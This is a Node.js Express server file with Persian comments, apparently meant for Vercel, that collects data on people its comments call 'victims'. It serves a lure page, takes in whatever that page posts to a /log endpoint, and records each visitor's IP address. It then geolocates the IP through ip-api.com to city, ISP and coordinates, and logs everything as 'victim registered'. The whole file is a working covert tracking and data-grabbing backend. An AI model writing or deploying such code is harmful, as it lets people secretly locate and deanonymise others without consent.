// server.js - نسخه نهایی و 100% کارکردی برای Vercel
const express = require('express');
const fetch = require('node-fetch');
const path = require('path');

const app = express();

// فعال‌سازی JSON و افزایش حد مجاز
app.use(express.json({ limit: '10mb' }));

// سرو کردن index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// دریافت اطلاعات قربانی
app.post('/log', async (req, res) => {
  const data = req.body || {};
  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
  
  data.ip = ip;
  data.timestamp = new Date().toISOString();

  // دریافت موقعیت جغرافیایی از IP
  if (ip && !ip.startsWith('127.') && !ip.startsWith('192.168') && ip !== '::1') {
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,city,regionName,country,isp,lat,lon,timezone`);
      const geo = await geoRes.json();
      
      if (geo.status === 'success') {
        data.location = {
          city: geo.city,
          region: geo.regionName,
          country: geo.country,
          isp: geo.isp,
          lat: geo.lat,
          lon: geo.lon,
          timezone_ip: geo.timezone
        };
      } else {
        data.location_error = geo.message || 'Unknown';
      }
    } catch (err) {
      console.error('Geo API خطا:', err.message);
      data.location_error = 'API unavailable';
    }
  }

  // نمایش در لاگ Vercel (این دقیقاً همون چیزیه که تو Logs می‌بینی)
  console.log('قربانی ثبت شد:', JSON.stringify(data, null, 2));

  // پاسخ سریع
  res.sendStatus(200);
});

// برای Vercel (مهم!)
module.exports = app;